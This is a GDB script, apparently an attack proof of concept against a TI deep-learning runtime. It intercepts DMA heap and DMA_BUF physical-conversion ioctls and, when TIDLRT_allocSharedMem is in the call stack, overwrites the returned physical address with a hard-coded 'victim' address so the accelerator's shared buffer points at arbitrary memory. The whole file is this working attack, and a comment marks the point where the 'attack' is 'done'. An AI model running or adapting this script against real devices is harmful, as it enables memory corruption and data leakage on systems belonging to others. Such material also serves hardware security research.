# Define constants for IOCTL commands 

define ioctldefs 

    set $DMA_HEAP_IOCTL_ALLOC = 0xc0184800 

    set $DMA_BUF_PHYS_CONVERT = 0xc0104400 

end 

 

# Global variables 

 

# Set your target address value here 

set $target_victim_physical_address = 0x80cc8000  

 

# Counter to track skips so that we target output buffer 

set $skip_count = 0  

# Set the number of skips required before action                          

set $max_skips = 1                           

 

# Load IOCTL command definitions 

ioctldefs 

 

# Catch the ioctl syscall 

catch syscall ioctl 

 

# Define actions to take on hitting the catchpoint 

commands 

    # Ensure only one thread is active 

    thread 1 

 

    # Fetch the ioctl command and data pointer (x1 = file descriptor, x2 = cmd, x3 = data pointer) 

    set $cmd = $x1 

    set $data_ptr = $x2 

 

    # Check for DMA_HEAP_IOCTL_ALLOC 

    if $cmd == $DMA_HEAP_IOCTL_ALLOC 

        printf "Detected DMA Heap allocation IOCTL (0x%x)\n", $cmd 

        set $len_val = *(unsigned long long *)$data_ptr 

        printf "Allocation length: 0x%016x\n", (unsigned long)$len_val 

    else 

        # Check for DMA_BUF_PHYS_CONVERT 

        if $cmd == $DMA_BUF_PHYS_CONVERT 

            printf "Detected DMA BUF physical conversion IOCTL (0x%x)\n", $cmd 

            set $phys_addr = *(unsigned *)($data_ptr + 8) 

            printf "Physical address: 0x%x\n", $phys_addr 

 

            # Check if phys_addr is non-zero 

            if $phys_addr != 0 

                printf "Physical address is non-zero, inspecting call stack...\n" 

 

                # Ensure the temporary file is clean 

                shell rm -f /tmp/backtrace.txt 

 

                # Save the backtrace output to a temporary file 

                set logging redirect on 

                set logging file /tmp/backtrace.txt 

                set logging on 

                backtrace 

                set logging off 

 

                # Use Python to parse the backtrace file and search for the function 

                python 

import re 

 

try: 

    with open('/tmp/backtrace.txt', 'r') as f: 

        backtrace = f.read() 

        match = re.search(r'TIDLRT_allocSharedMem', backtrace, re.IGNORECASE) 

        gdb.execute('set $found = 1' if match else 'set $found = 0') 

except Exception as e: 

    gdb.write(f"Error processing backtrace: {e}\n", gdb.STDERR) 

                end 

 

                if $found 

                    printf "TIDLRT_allocSharedMem found in call stack.\n" 

                     

                    # Implement skip logic 

                    if $skip_count < $max_skips 

                        printf "Skipping this match. Current skip count: %d\n", $skip_count 

                        set $skip_count = $skip_count + 1 

                    else 

                        printf "Match after %d skips. Setting physical address to target value.\n", $max_skips 

                        printf "Original value at (unsigned long long *)($data_ptr + 8): 0x%lx\n", *(unsigned long long *)($data_ptr + 8) 

                        set *(unsigned long long *)($data_ptr + 8) = $target_victim_physical_address 

                        printf "Value set to target victim physical address at (unsigned long long *)($data_ptr + 8): 0x%lx\n", $target_victim_physical_address 

 

                        # Reset skip count after setting 

                        set $skip_count = 0 

 

                        # delete all breakpoints attack done 

                        del br 

                    end 

 

                    # Clean up the temporary file 

                    shell rm -f /tmp/backtrace.txt 

                else 

                    printf "TIDLRT_allocSharedMem not found in call stack.\n" 

                end 

 

                # Clean up the temporary file 

                shell rm -f /tmp/backtrace.txt 

            end 

        end 

    end 

 

    continue 

end 